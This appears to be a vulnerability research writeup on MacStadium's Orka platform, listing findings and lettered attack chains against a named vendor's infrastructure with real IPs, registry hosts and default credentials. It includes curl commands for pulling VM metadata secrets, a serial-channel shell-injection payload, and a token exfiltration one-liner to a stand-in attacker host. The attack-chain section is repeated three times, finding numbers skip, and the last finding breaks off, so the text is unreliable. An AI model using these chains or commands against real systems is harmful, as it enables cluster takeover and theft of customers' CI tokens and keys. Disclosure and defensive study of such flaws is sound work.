# Orka Platform Reverse Engineering — Findings

## Platform Architecture

```
Customer / CI
     │
     ▼
  orka3 CLI  ────────────►  Orka API Server
  (Go binary)               10.221.188.20 (v2.1+)
  ~/.kube/config            10.221.188.100 (pre-2.1)
                                   │
                                   │  JWT = K8s SA token
                                   ▼
                           Kubernetes API Server
                           (orka-default namespace)
                                   │
                              ┌────┴────┐
                              │  VMs    │
                           Mac nodes (Apple Silicon)
                              │
                  ┌───────────┤
                  │           │
            /dev/tty.virtio   │
          (virtio serial)    virtiofs
                  │
                  ▼
          orka-vm-tools daemon (in VM)
          - Metadata HTTP server: 169.254.169.254
          - Clipboard sync
          - Display resolution
          - Partition resize
```

---

## CRITICAL FINDINGS

### F1 — Unauthenticated /api/v1/cluster-info
- **Endpoint**: `GET http://10.221.188.20/api/v1/cluster-info`
- **Auth**: NONE
- **Returns**:
  ```json
  {
    "apiDomain": "string",
    "apiEndpoint": "string",     // K8s API server URL
    "appClientId": "string",     // OIDC client ID
    "baseOauthEndpoint": "string", // OAuth provider URL
    "certData": "string",        // K8s CA certificate (base64)
    "gpuPassthroughEnabled": false
  }
  ```
- **Impact**: Exposes K8s CA cert + OAuth client ID before any auth. Attacker can impersonate OAuth flows, validate K8s API connections.

### F2 — Default VM Credentials admin:admin
- **Every** MacStadium base image ships with `admin:admin`
- Docs warn: "every VM on your cluster shares the same default"
- SSH on port 8822, VNC on 5999, screenshare on 5901
- Orka API list response includes VM IP + all port numbers
- Attack: enumerate VMs → SSH admin:admin → inside VM

### F3 — VM Metadata Server: No Authentication
- Runs inside every VM at `169.254.169.254`
- `orka/vm-metadata/pkg/api.AddMetadataRoutes`:
  - `GET /metadata/keys` — list all keys
  - `GET /metadata/{key}` — get value
  - `GET /debug/pprof/` — Go profiling endpoint (leaked!)
- No auth, no crypto — docs state this explicitly
- Any process inside the VM reads ALL metadata
- Customers store GitHub PATs, secrets here against guidance

### F4 — Orka Auth = K8s Auth (Full K8s Access)
- orka3 CLI stores tokens in `~/.kube/config`
- "If your kubectl configuration works, orka3 works too"
- Orka tokens ARE Kubernetes service account tokens
- Valid token → direct `kubectl` access to the cluster
- Service account tokens: 1-year TTL, non-expiring option
- Default namespace: `orka-default`

### F5 — mount_virtiofs Format String (Potential Injection)
- Binary string: `Executed mount cmd: 'mount_virtiofs %s %s'`
- Mount source/tag and mountpoint injected as format args
- Source: serial channel message from Orka engine
- If virtiofs tag or mountpoint not sanitized: shell injection
- Needs: control of `customMetadata` in VM deploy body OR serial channel write access

### F6 — Remote Image Pull (No Auth Check)
- API: `POST /api/v1/namespaces/{namespace}/remoteimages/{remoteimage}/pull`
- NOT marked with `(requires BearerTokenAuth)` in spec
- May be unauthenticated pull trigger

### F7 — OCI Disk Layer INT32 Overflow (364/369 layers)
- Custom media type: `vnd.macstadium.orka-engine.disk.layer.v1+lz4`
- Layer offset annotation: `com.macstadium.orka-engine.disk.layer.offset`
- tahoe-base:v1 has 369 layers, 364 exceed INT32_MAX (2,147,483,647)
- Layer 3 offset: 2,348,810,240 → int32: -1,946,157,056
- Layer 4 offset: 2,952,790,016 → int32: -1,342,177,280
- Layers 7+ exceed UINT32_MAX — require 64-bit handling
- If orka-engine uses int32/uint32 anywhere in seek arithmetic: write to wrong disk sector
- Supply chain vector: push crafted layer with offset=2^32 to target GPT header (sector 0)

---

## API ENDPOINT MAP

Base URL: `http://10.221.188.20` (or `http://10.221.188.100`)
Auth: `Authorization: Bearer <TOKEN>` (all except cluster-info)

### Unauthenticated
```
GET  /api/v1/cluster-info               — K8s CA cert, OAuth client
GET  /version                           — version info
POST /api/v1/namespaces/{ns}/remoteimages/{ri}/pull  — POSSIBLY unauth
```

### Authenticated (BearerToken)
```
# Namespaces
GET/POST       /api/v1/namespaces
GET/DELETE     /api/v1/namespaces/{namespace}

# VMs
GET            /api/v1/namespaces/{ns}/vms
POST           /api/v1/namespaces/{ns}/vms          — deploy VM
GET/DELETE     /api/v1/namespaces/{ns}/vms/{vm}
POST           /api/v1/namespaces/{ns}/vms/{vm}/exec — lifecycle cmd
POST           /api/v1/namespaces/{ns}/vms/{vm}/push — push to OCI
POST           /api/v1/namespaces/{ns}/vms/{vm}/commit
POST           /api/v1/namespaces/{ns}/vms/{vm}/save
POST           /api/v1/namespaces/{ns}/vms/{vm}/resize

# Images
GET/POST       /api/v1/namespaces/{ns}/images
GET/DELETE     /api/v1/namespaces/{ns}/images/{image}
POST           /api/v1/namespaces/{ns}/images/{image}/copy
GET            /api/v1/namespaces/{ns}/images/{image}/download
POST           /api/v1/namespaces/{ns}/upload/image

# Service Accounts
GET            /api/v1/namespaces/{ns}/serviceaccounts
POST           /api/v1/namespaces/{ns}/serviceaccounts/{sa}
POST           /api/v1/namespaces/{ns}/serviceaccounts/{sa}/token  — issues 1yr token
DELETE         /api/v1/namespaces/{ns}/serviceaccounts/{sa}

# Secrets (registry creds)
GET            /api/v1/namespaces/{ns}/secrets/registrycredentials
POST           /api/v1/namespaces/{ns}/secrets/registrycredentials/add
DELETE         /api/v1/namespaces/{ns}/secrets/registrycredentials/remove

# RBAC
POST           /api/v1/namespaces/{ns}/rolebindings/orka-dev/subjects/add
DELETE         /api/v1/namespaces/{ns}/rolebindings/orka-dev/subjects/remove

# Nodes
GET            /api/v1/namespaces/{ns}/nodes
POST           /api/v1/namespaces/{ns}/nodes/{name}/tag
POST           /api/v1/namespaces/{ns}/nodes/{name}/namespace

# TLS
POST           /api/v1/upload/cert                  — custom TLS cert upload
```

---

## VM DEPLOY REQUEST BODY
```json
{
  "image": "ghcr.io/macstadium/orka-images/sequoia:latest",
  "name": "optional-vm-name",
  "cpu": 3,
  "memory": 8,
  "customMetadata": {"key": "value"},
  "reservedPorts": "8080:8080",
  "vnc": true,
  "node": "optional-node-selector",
  "tag": "optional-affinity-tag",
  "timeout": 600
}
```

## VM LIST RESPONSE — Each Item
```json
{
  "name": "vm-name",
  "image": "ghcr.io/...",
  "ip": "10.x.x.x",
  "ssh": 8822,
  "vnc": 5999,
  "screenshare": 5901,
  "cpu": 3,
  "memory": "8",
  "node": "node-name",
  "owner": "user@email.com",
  "status": "Running",
  "type": "arm64"
}
```

---

## SOURCE CODE CONFIRMATIONS

### config.go (packer-plugin-macstadium-orka/builder/orka/config.go)
```go
const (
    defaultUserName = "admin"
    defaultPassword = "admin"
)

// In Prepare():
if c.CommConfig.SSHUsername == "" {
    c.CommConfig.SSHUsername = defaultUserName  // "admin"
}
if c.CommConfig.SSHPassword == "" {
    c.CommConfig.SSHPassword = defaultPassword  // "admin"
}
```
**admin:admin is a source-level constant in the official packer plugin.**

### orka_client.go — /api/v1/cluster-info fetch is unauthenticated
```go
// No token, no auth header — plain http.Get
resp, err := http.Get(endpoint)  // endpoint = ORKA_URL/api/v1/cluster-info
// Then uses the returned certData directly as K8s CA:
restConfig := &rest.Config{
    Host:        clusterInfo.APIEndpoint,  // K8s API server
    BearerToken: authToken,                // Orka token IS K8s bearer token
    TLSClientConfig: rest.TLSClientConfig{
        CAData: []byte(clusterInfo.CertData),  // K8s CA from unauthenticated endpoint
    },
}
```

### orka3 CLI auth (confirmed from SKILL.md)
- `orka3 login` → browser OIDC → token stored in `~/.kube/config`
- `orka3 user get-token` → prints raw K8s bearer token
- User tokens: 1 hour TTL
- SA tokens: 1 year (default), `--no-expiration` available
- `orka3 user set-token $TOKEN` → writes token to kubeconfig

---

## orka-vm-tools Binary RE

**Binary**: `Applications/orka-vm-tools/orka-vm-tools`
**Type**: Mach-O 64-bit arm64
**Size**: 8.9MB
**Built with**: Go + cgo (CoreFoundation, IOKit, CGDisplay APIs)

### Internal Modules
- `macstadium/orka-vm-tools/vm` — VM tools core
- `macstadium/orka-vm-tools/utils` — Exec, GetEnv, GetOSVersion, ProcessEnv
- `orka/vm-metadata` — embedded metadata server
- `orka/vm-metadata/pkg/api` — AddMetadataRoutes, handleGetMetadataKeys, handleGetValueByKey
- `orka/vm-metadata/pkg/metadata` — GetMetadataKeys, GetValueByKey, SetMetadata
- `orka/vm-metadata/pkg/router` — chi router with timeout middleware

### Serial Channel Protocol
- Device: `/dev/tty.virtio`
- Type: `*vm.serialChannel` — reads JSON messages
- Direction: host (Orka engine) → guest (vm-tools)
- Messages processed by `(*Tools).onMessageReceived`
- Init messages: `vm_initialize`, `vm_os_version`, `tools_version`
- Commands: clipboard sync, display resolution, virtiofs mounts, metadata injection, disk resize

### Metadata Server Routes
- Listen: `169.254.169.254` (IMDS address)
- Router: chi (goroutine-based HTTP)
- `GET /metadata/keys` — list all custom metadata keys
- `GET /metadata/{key}` — retrieve value by key
- `GET /debug/pprof/` — Go profiling (leaked endpoint)
- **Zero authentication**

### Virtiofs Mount Command
```go
// Exact format string from binary:
"Executed mount cmd: 'mount_virtiofs %s %s'"
// args: virtiofs-tag mountpoint
// Source: serial channel message from Orka engine
// Risk: if tag/mountpoint unsanitized → shell injection
```

### Environment Variables
- `ORKA_MODE` — "agent" (LaunchAgent) or daemon mode
- `ORKA_AUTOMATICALLY_SET_RESOLUTION` — "1" to auto-set display
- `ORKA_VM_TOOLS_PATH` — `/Applications/orka-vm-tools`
- `ORKA_VM_TOOLS_DIR` — tools directory
- `ORKA_VM_LOG_LEVEL` — log verbosity
- `VM_DEFAULT_PASSWORD` — used in setup.sh for non-interactive sudo

---

## RBAC MODEL

4 built-in roles:
- `orka-admin` — full admin (namespaced)
- `orka-dev` — developer (namespaced)
- `orka-namespace-admin` — namespace lifecycle (cluster-wide)
- `orka-clusterwide-dev` — read-only CRD visibility (cluster-wide)

OIDC groups:
- `oidc:Administrator` — maps to admin
- `oidc:Technical` — maps to dev

Auth backends: MacStadium OIDC (default), custom OIDC, cert/token

---

## ORKA3 BINARY RE (orka3 v3.5.2 x86-64 Linux, 77MB, not stripped)

**Built on**: GitHub Actions (`/home/runner/go/`)
**Go module**: `macstadium.com/orka-cli-v2` (private)
**Private dependencies**:
- `macstadium.com/orka-apiserver` v0.0.0 — API server (private)
- `macstadium.com/orka-go` v0.0.0 — shared Go library
- `macstadium.com/orka-operator` v0.0.0 — K8s operator CRDs
**K8s client-go version**: v0.27.4

### K8s CRDs from Operator (embedded in binary)
- `orka-operator/api/v1.VirtualMachineInstance` + `List`
- `orka-operator/api/v1.VirtualMachineConfig` + `List`
- `orka-operator/api/v1.Image` + `List`
- `orka-operator/api/v1.ImageCache` + `List`
- `orka-operator/api/v1.Iso` + `List`
- `orka-operator/api/v1.OrkaNode` + `List`
- `orka-operator/api/v1.RemoteImage` + `List` (maps to F6 — remote image pull)
- `orka-operator/api/v1.RemoteIso` + `List`

### Internal OIDC Auth Types
- `cmd/user.AuthServer` — OIDC server configuration
- `cmd/user.AuthState` — OAuth PKCE state
- `cmd/user.ClusterInfo` — /api/v1/cluster-info response struct
- `cmd/user.TokenResponse` — OAuth token response

### K8s Annotations/Labels
```
orka.macstadium.com/namespace      — namespace label
orka.macstadium.com/vm-config      — VM config template annotation
orka.macstadium.com/oci-image      — OCI image annotation
orka.macstadium.com/image.name     — image name
orka.macstadium.com/node.name      — node name
orka.macstadium.com/description    — description
orka.macstadium.com/job.type       — batch job type (registry-push)
orka.macstadium.com/last.updated   — update timestamp
```

### Internal Harbor (NodePort — on-prem cluster)
From help text example embedded in binary:
```
orka3 regcred add --allow-insecure http://10.221.188.5:30080 --username admin --password p@ssw0rd
```
- `10.221.188.5:30080` — internal Harbor running as K8s NodePort service
- Different from external Las Vegas Harbor (`*.oci.las1.macstadiumcloud.com`)
- HTTP, no TLS — insecure transport within cluster

### API Server Internal Route Type
`macstadium.com/orka-apiserver/routes/api/v1.OrkaServiceAccountTokenRequestModel` — SA token request body shape (private, not in public API docs)

---

## HARBOR REGISTRIES (Las Vegas)

- `orkv10000009-01.oci.las1.macstadiumcloud.com` → `207.254.58.99`
- `orkv10000075-01.oci.las1.macstadiumcloud.com`
- `orkv10000076-01.oci.las1.macstadiumcloud.com`

S3 object store: `1.obj.las1.macstadiumcloud.com`
Bucket structure: `/{registry-hostname}/docker/registry/v2/blobs/...`
Auth: `admin:Harbor12345` — pull only, push blocked

Known repos:
- `library/tahoe-base` — 369 layers, 704GB macOS disk image
  - Config: `sha256:dd7c1f318f...` (291 bytes)
  - 364/369 layers exceed INT32_MAX
  - Layers 7+ exceed UINT32_MAX

---

## ATTACK CHAINS

### Chain A: Pre-Auth K8s Takeover (if Orka API reachable)
1. `GET /api/v1/cluster-info` → get certData (K8s CA) + apiEndpoint
2. Use appClientId + baseOauthEndpoint to attempt OAuth token
3. If OAuth bypassed → K8s SA token → kubectl access
4. `GET /api/v1/namespaces/orka-default/vms` → enumerate all VMs, get IPs/ports
5. SSH admin:admin to any VM on port 8822

### Chain B: VM-Side Lateral Movement (if VM access obtained)
1. SSH admin:admin into any VM (port 8822)
2. `curl http://169.254.169.254/metadata/keys` → enumerate secrets
3. Read customer GitHub PATs, CI tokens, passwords
4. `curl http://169.254.169.254/debug/pprof/` → memory dumps, goroutine state

### Chain C: Supply Chain via Harbor (if push access obtained)
1. Craft OCI manifest with layer at offset=4,294,967,296 (2^32)
2. If orka-engine uses int32: 2^32 % 2^32 = 0 → writes to GPT header
3. Push to Harbor as replacement for tahoe-base:v1
4. When Orka provisions VM → corrupted disk → arbitrary sector write

### F8 — Buildkite CI/CD: SSH Agent Forwarding + Token Injection to admin:admin VM
- **Source**: `orka-integrations/Buildkite/scripts/bootstrap.sh`
- `ORKA_VM_USER=${ORKA_VM_USER:-admin}` — defaults to admin
- SSH connects with `-A` (agent forwarding) + `-o StrictHostKeyChecking=no` + no `UserKnownHostsFile`
- Env vars explicitly injected into VM session:
  - `BUILDKITE_AGENT_ACCESS_TOKEN` — the Buildkite pipeline API token
  - `BUILDKITE_BUILD_PATH`, `BUILDKITE_HOOKS_PATH`, `BUILDKITE_PLUGINS_PATH`
- No host key verification → MITM possible between CI host and VM
- Agent forwarding on an admin:admin VM → any local process can hijack the forwarded SSH agent socket
- `hooks/environment` mounts SSH private keys from `/buildkite-secrets/*` into the agent — all keys readable
- **Chain**: Deploy Orka VM (admin:admin) → intercept SSH agent forwarding → steal Buildkite access token + all SSH private keys
- **Impact**: Full Buildkite pipeline takeover, access to all repos connected to those SSH keys

---

## ATTACK CHAINS

### Chain A: Pre-Auth K8s Takeover (if Orka API reachable)
1. `GET /api/v1/cluster-info` → get certData (K8s CA) + apiEndpoint
2. Use appClientId + baseOauthEndpoint to attempt OAuth token
3. If OAuth bypassed → K8s SA token → kubectl access
4. `GET /api/v1/namespaces/orka-default/vms` → enumerate all VMs, get IPs/ports
5. SSH admin:admin to any VM on port 8822

### Chain B: VM-Side Lateral Movement (if VM access obtained)
1. SSH admin:admin into any VM (port 8822)
2. `curl http://169.254.169.254/metadata/keys` → enumerate secrets
3. Read customer GitHub PATs, CI tokens, passwords
4. `curl http://169.254.169.254/debug/pprof/` → memory dumps, goroutine state

### Chain C: Supply Chain via Harbor (if push access obtained)
1. Craft OCI manifest with layer at offset=4,294,967,296 (2^32)
2. If orka-engine uses int32: 2^32 % 2^32 = 0 → writes to GPT header
3. Push to Harbor as replacement for tahoe-base:v1
4. When Orka provisions VM → corrupted disk → arbitrary sector write

### F9 — GitLab: SSH Private Key + Orka Token Exposed as Env Vars to All Pipeline Jobs
- **Source**: `orka-integrations/GitLab/scripts/base.sh`
- `ORKA_SSH_KEY_FILE=${CUSTOM_ENV_ORKA_SSH_KEY_FILE:-}` — SSH private key passed as **string content** in env var
- `echo "$ORKA_SSH_KEY_FILE" > ~/.ssh/orka_deployment_key` — key written from env to disk
- `CUSTOM_ENV_ORKA_TOKEN` — Orka K8s service account token also in environment
- GitLab custom executor: ALL `CUSTOM_ENV_*` vars are in every job's environment
- **Attack**: Malicious job (supply chain, attacker PR, compromised dependency) reads env directly — no VM access needed
- `ORKA_VM_USER` defaults to `admin`
- **Impact**: SSH key + K8s token exfiltration from any pipeline that runs untrusted code

### F10 — orka3 CLI Binary Downloaded Without Checksum Verification
- **Source**: `orka-integrations/GitLab/Dockerfile`
- `wget https://cli-builds-public.s3.eu-west-1.amazonaws.com/official/${ORKA_CLI_VERSION}/orka3/linux/amd64/orka3.tar.gz`
- No SHA256 verification, no GPG signature check
- S3 bucket: `cli-builds-public.s3.eu-west-1.amazonaws.com` — if bucket ACLs misconfigured or key leaked, attacker can replace binary
- Deployed as trusted `orka3` binary with K8s cluster access
- **Impact**: Supply chain compromise → backdoored orka3 → all K8s tokens, all VMs

### F11 — Intel Disk Resize: SSH Credentials on Command Line
- **Source**: vm-commands.md, orka3 CLI reference
- `orka3 vm resize intel-vm 100 --user admin --password admin`
- SSH credentials visible in process listing (`ps aux`), shell history, CI logs
- **Impact**: Credential exposure in multi-tenant CI environments

### F12 — System Serial Spoofing (Intel VMs)
- **Source**: vm-commands.md, VirtualMachineInstanceSpec.SystemSerial
- `orka3 vm deploy --image ventura.img --system-serial A00BC123D4`
- Custom serial number set on any Intel VM by authenticated user
- macOS uses serial for Apple ID binding, software licensing, DRM, MDM enrollment
- **Impact**: Clone another customer's hardware identity; bypass per-device licensing

---

## ATTACK CHAINS

### Chain A: Pre-Auth K8s Takeover (if Orka API reachable)
1. `GET /api/v1/cluster-info` → get certData (K8s CA) + apiEndpoint
2. Use appClientId + baseOauthEndpoint to attempt OAuth token
3. If OAuth bypassed → K8s SA token → kubectl access
4. `GET /api/v1/namespaces/orka-default/vms` → enumerate all VMs, get IPs/ports
5. SSH admin:admin to any VM on port 8822

### Chain B: VM-Side Lateral Movement (if VM access obtained)
1. SSH admin:admin into any VM (port 8822)
2. `curl http://169.254.169.254/metadata/keys` → enumerate secrets
3. Read customer GitHub PATs, CI tokens, passwords
4. `curl http://169.254.169.254/debug/pprof/` → memory dumps, goroutine state

### Chain C: Supply Chain via Harbor (if push access obtained)
1. Craft OCI manifest with layer at offset=4,294,967,296 (2^32)
2. If orka-engine uses int32: 2^32 % 2^32 = 0 → writes to GPT header
3. Push to Harbor as replacement for tahoe-base:v1
4. When Orka provisions VM → corrupted disk → arbitrary sector write

### Chain D: Serial Channel Injection (if host access obtained)
1. Write to guest's `/dev/tty.virtio` from host
2. Inject virtiofs mount message with crafted tag containing shell metacharacters
3. `mount_virtiofs 'tag; /payload' /mountpoint` → code exec inside VM

### Chain E: GitLab CI/CD Env Exfil (no VM access needed)
1. Submit PR or inject malicious dependency into a pipeline using orka-integrations GitLab executor
2. CI job executes with `CUSTOM_ENV_ORKA_TOKEN` and `CUSTOM_ENV_ORKA_SSH_KEY_FILE` in environment
3. `printenv CUSTOM_ENV_ORKA_TOKEN | curl -X POST attacker.io/exfil -d @-`
4. Use K8s SA token to authenticate to Orka API → enumerate all namespaces and VMs
5. SSH to any VM using exfiltrated private key

### Chain F: Binary Supply Chain (S3 bucket compromise)
1. Compromise `cli-builds-public.s3.eu-west-1.amazonaws.com` — bucket-level or AWS key leak
2. Replace `orka3.tar.gz` with backdoored binary
3. All new GitLab runner container builds pull backdoored binary
4. Backdoored binary intercepts `orka3 user set-token $TOKEN` and exfiltrates token
5. → Full cluster access

### Chain G: GitHub Actions MITM — JITConfig Theft
1. Attacker on Orka internal network intercepts TCP to VM IP (ARP spoof or rogue DHCP)
2. GitHub Actions integration `VMCommandExecutor` connects SSH with `HostKeyCallback: nil` — no verification
3. MITM receives the JITConfig token sent via SSH stdin
4. Attacker uses JITConfig to register their own runner for the target GitHub repo
5. → All subsequent CI jobs route to attacker-controlled runner → code + secrets exposure

### Chain H: orka-images Setup Supply Chain
1. `setup.sh` downloads `orka-vm-tools.pkg` from `orka-tools.s3.amazonaws.com` with NO checksum
2. `setup.sh` also downloads `setup-sys-daemon.sh` from raw GitHub and runs as sudo with NO checksum
3. Compromise either S3 bucket or GitHub repo (or MITM the HTTP transfer)
4. Backdoored `orka-vm-tools` runs as root daemon inside every VM at boot
5. → Persistent code execution in all VMs, visible to all customers

---

## NEW FINDINGS — GitHub Actions Integration (pkg source RE)

### F13 — GitHub Actions Integration: admin:admin Default (Source-Confirmed)
- **Source**: `pkg/env/env.go:ParseEnv()`
- **Code**:
  ```go
  OrkaVMUsername: getEnvWithDefault(OrkaVMUsernameEnvName, "admin"),
  OrkaVMPassword: getEnvWithDefault(OrkaVMPasswordEnvName, "admin"),
  ```
- **Impact**: Any deployment that doesn't explicitly set `ORKA_VM_USERNAME` / `ORKA_VM_PASSWORD` uses admin:admin. Consistent with packer-plugin constants.
- **Severity**: CRITICAL (cross-confirms F2)

### F14 — GitHub Actions Integration: SSH MITM via HostKeyCallback=nil
- **Source**: `pkg/orka/vm-commnd-executor.go:ExecuteCommands()`
- **Code**:
  ```go
  HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
      return nil  // accepts any host key — no verification
  },
  ```
- **Impact**: Any attacker on the Orka internal network can intercept SSH sessions from the controller to VMs. The controller connects using VM IP from the Orka API response — if that IP is spoofed, MITM is transparent.
- **Severity**: HIGH

### F15 — GitHub Actions Integration: JITConfig Sent via MITM-able SSH Channel
- **Source**: `pkg/runner-provisioner/provisioner.go:buildCommands()`
- **Code**:
  ```go
  "/Users/$USERNAME/actions-runner/run.sh --jitconfig $JITCONFIG",
  ```
  Written to SSH stdin via `stdinBuf.Write([]byte(strings.Join(commands, "\n") + "\nexit\n"))`
- **Impact**: JITConfig (GitHub short-lived runner registration token) is sent as plaintext via the SSH channel. If SSH is MITM'd (see F14), attacker receives JITConfig and can register a malicious runner to the target GitHub repository.
- **Severity**: CRITICAL (chains with F14)

### F16 — GitHub Actions Integration: Lifecycle Sentinel Files in /tmp
- **Source**: `pkg/runner-provisioner/provisioner.go`
- **Code**:
  ```go
  const (
      SentinelSetupComplete = "/tmp/orka-runner-setup-complete"
      SentinelRunComplete   = "/tmp/orka-runner-run-complete"
  )
  ```
- **Impact**: These world-writable files control runner lifecycle. Attacker with code exec in the VM (via admin:admin SSH) can touch `SentinelRunComplete` to signal premature completion and prevent legitimate CI from running, or use as a timing oracle.
- **Severity**: MEDIUM

### F17 — GitHub Actions Integration: Orka Token Visible in ps(1)
- **Source**: `pkg/orka/client.go:NewOrkaClient()`
- **Code**:
  ```go
  _, err = exec.ExecStringCommand("orka3", []string{"user", "set-token", envData.OrkaToken})
  ```
- **Impact**: `OrkaToken` (K8s SA token, 1-year default TTL) passed as CLI argument. Visible in `/proc/<pid>/cmdline` and `ps aux` during execution. Any process running as same user or root can read it.
- **Severity**: HIGH

### F18 — GitHub Actions Integration: GitHub App Private Key in Process Environment
- **Source**: `pkg/env/env.go:ParseEnv()`
- **Code**:
  ```go
  GitHubAppPrivateKey: os.Getenv(GitHubAppPrivateKeyEnvName),
  ```
- **Impact**: The GitHub App private key used to mint runner JIT tokens is loaded from environment. Code execution in the container → key theft → attacker mints JIT tokens for any runner scale set the App controls → attacker registers runners to any repository in the GitHub org.
- **Severity**: HIGH

### F19 — orka-images setup.sh: Unverified Downloads Run as Root
- **Source**: `macstadium/orka-images/setup/setup.sh`
- **Code**:
  ```bash
  curl -fsSL "$pkg_url" -o "$pkg_path"        # No --hash-check, no checksum
  sudo_run installer -pkg "$pkg_path" -target /
  
  curl -fsSL "$script_url" -o "$script_path"  # No checksum
  sudo_run bash "$script_path"                # Executed as root
  ```
  URLs: `https://orka-tools.s3.amazonaws.com/orka-vm-tools/official/${VERSION}/orka-vm-tools.pkg`
  and: `https://raw.githubusercontent.com/macstadium/packer-plugin-macstadium-orka/main/guest-scripts/setup-sys-daemon.sh`
- **Impact**: Compromise of either S3 bucket or GitHub repo (or HTTPS downgrade via weak cert validation in curl) results in arbitrary root execution on every new Orka VM build.
- **Severity**: CRITICAL (supply chain)

### F20 — orka-images setup.sh: VM_DEFAULT_PASSWORD Used for sudo
- **Source**: `macstadium/orka-images/setup/setup.sh`
- **Code**:
  ```bash
  sudo_run() {
      if [[ -n "${VM_DEFAULT_PASSWORD:-}" ]]; then
          echo "$VM_DEFAULT_PASSWORD" | sudo -S "$@"
      fi
  }
  ```
- **Impact**: `VM_DEFAULT_PASSWORD` must be set in the environment for non-interactive SSH-based setup. This password appears in environment vars during the setup phase. Combined with `clear_shell_history` at the end, confirms MacStadium knows the default password persists and tries to hide it without actually changing it.
- **Severity**: MEDIUM

### F21 — OIDC Auth Flow: PKCE Auth Code Received on Localhost Dynamic Port
- **Source**: Binary RE — symbol names from `cmd/user` package
- **Functions**: `generateOidcLoginUrl`, `listenOnNextFreePort`, `redirectHandler`, `fetchTokenForAuthCode`, `extractIdToken`, `updateKubeConfig`
- **Flow**:
  ```
  orka3 login
    → generateOidcLoginUrl (PKCE code_challenge + state)
    → listenOnNextFreePort → http://localhost:<N>/callback
    → browser opens to baseOauthEndpoint (from unauthenticated cluster-info)
    → redirectHandler receives auth code
    → fetchTokenForAuthCode exchanges code for access_token + id_token
    → extractIdToken pulls JWT from TokenResponse
    → updateKubeConfig writes token to ~/.kube/config
  ```
- **Impact**: The OAuth redirect lands on a dynamic localhost port. A malicious process running as the same user can race to bind that port before orka3 and steal the auth code (auth code interception attack). The OIDC provider URL is disclosed unauthenticated via F1.
- **Severity**: MEDIUM (requires local user access)

### F23 — GitHub Actions Integration: Token Value in Error Log
- **Source**: `pkg/exec/exec.go:ExecStringCommand()`
- **Code**:
  ```go
  return "", fmt.Errorf("command '%s %s' failed with output: %q, error: %v",
      command, strings.Join(args, " "), out, err)
  ```
  Called with: `exec.ExecStringCommand("orka3", []string{"user", "set-token", envData.OrkaToken})`
- **Impact**: If `orka3 user set-token $TOKEN` fails (expired token, network error), the error message contains `orka3 user set-token <full_token_value>`. This error propagates through the provisioner and is logged to stdout/stderr. In any log aggregation setup, the K8s SA token is captured in plaintext.
- **Severity**: HIGH

### F24 — orka-images: SSH + VNC Mandatory in All Base Images
- **Source**: `macstadium/orka-images/setup/verify.sh`
- **Code**:
  ```bash
  if sudo_run launchctl list | grep -q com.openssh.sshd; then
      pass "SSH running"
  else
      fail "SSH (com.openssh.sshd) not running"  # exits non-zero
  fi
  if sudo_run launchctl list | grep -q com.apple.screensharing; then
      pass "Screen Sharing running"
  else
      fail "Screen Sharing (com.apple.screensharing) not running"  # exits non-zero
  fi
  ```
- **Impact**: The image build pipeline FAILS if SSH and Screen Sharing are not running. These services are build requirements, not optional. Every Orka base image ships with SSH (admin:admin) and VNC listening as mandatory services — there is no hardened image variant without them.
- **Severity**: MEDIUM (amplifies F2 — admin:admin SSH is guaranteed across all images)

### F26 — orka-engine: New Distribution Domain, No Checksum (supply chain)
- **Source**: `install_engine.yml` + `roles/install_engine/tasks/main.yml`
- **URL**: `https://distribution.macstadium.com/orka-engine/official/3.5.2/orka-engine.pkg`
- **Code**:
  ```yaml
  - name: Download PKG file
    ansible.builtin.get_url:
      url: "{{ install_engine_pkg_url }}"
      dest: "{{ install_engine_pkg_path }}"
      force: true
      mode: "0644"
  # No checksum: parameter
  - name: Install PKG file
    become: true
    ansible.builtin.command: installer -pkg "{{ install_engine_pkg_path }}" -target /
  ```
- **Impact**: Third distribution domain (`distribution.macstadium.com`) downloads `orka-engine.pkg` without checksum verification and installs it as root. Compromise of this domain = persistent root backdoor in the hypervisor layer on every Mac node. The package installs as a launchd service (`com.macstadium.orka-engine.server.managed`) that runs at boot.
- **Severity**: CRITICAL (supply chain — physical hypervisor layer)

### F27 — orka-engine: License Key in Launch Daemon Environment
- **Source**: `roles/install_engine/templates/com.macstadium.orka-engine.server.managed.plist.j2`
- **Config**:
  ```xml
  <key>ORKA_ENGINE_LICENSE_KEY</key>
  <string>{{ install_engine_license_key }}</string>
  ```
- **Impact**: The Orka Engine license key is set as an environment variable in the launchd service configuration (`/Library/LaunchDaemons/`). Any local process can read it via `/proc/<pid>/environ` equivalent or `ps eww`. License key theft could allow deploying unauthorized Orka engines.
- **Severity**: MEDIUM

### F28 — orka-engine: Unix Socket at /var/run/orka-engine.sock
- **Source**: `roles/install_engine/defaults/main.yml` + plist template
- **Config**:
  ```
  install_engine_socket_path: "/var/run/orka-engine.sock"
  ORKA_ENGINE_SOCK = /var/run/orka-engine.sock
  ```
  CLI wrapper: `exec "/usr/local/libexec/orka-engine.app/Contents/MacOS/orka-engine" "$@"` — routes all commands to this socket
- **Impact**: The hypervisor control socket. If an attacker gains local access to a Mac node (via VM escape, SSH as admin, or supply chain compromise), communicating with this socket provides full VM management on the physical host — create, stop, delete, snapshot any VM running on that node, bypassing the K8s/Orka API entirely.
- **Severity**: HIGH (post-escape escalation vector)

### F29 — Android AVD Console Relay: Unauthenticated Access from VM Guests
- **Source**: `library/avd.py` + `module_utils/orka_utils.py`
- **Code**:
  ```python
  CONSOLE_PORT_START = 5554
  # relay_port = (console_port + 1) + 10_000
  # First AVD: console=5554, relay=15555
  # Second AVD: console=5556, relay=15557
  
  ["/opt/orka/bin/run-avd", "-p", str(console_port), "-b", self.bridge_ip, "-r", str(relay_port)]
  # socat relay bridges console_port → relay_port
  ```
- **Impact**: Android emulator telnet console (port 5554) is proxied via socat to relay ports (15555+) accessible from within Orka VM guests. Android emulator console is **unauthenticated by default** (Android <5.0) or requires `auth <token>` from `~/.emulator_console_auth_token` (Android ≥5.0). From inside an Orka VM, `nc <host> 15555` gives direct emulator console access — inject input events, read SMS, access contacts, take screenshots.
- **Severity**: HIGH (tenant isolation failure — cross-customer AVD access)

### F30 — orka-engine: Binary Path in orka-engine.sh.j2 is Hardcoded
- **Source**: `roles/install_engine/templates/orka-engine.sh.j2`
- **Code**:
  ```bash
  exec "/usr/local/libexec/orka-engine.app/Contents/MacOS/orka-engine" "$@"
  ```
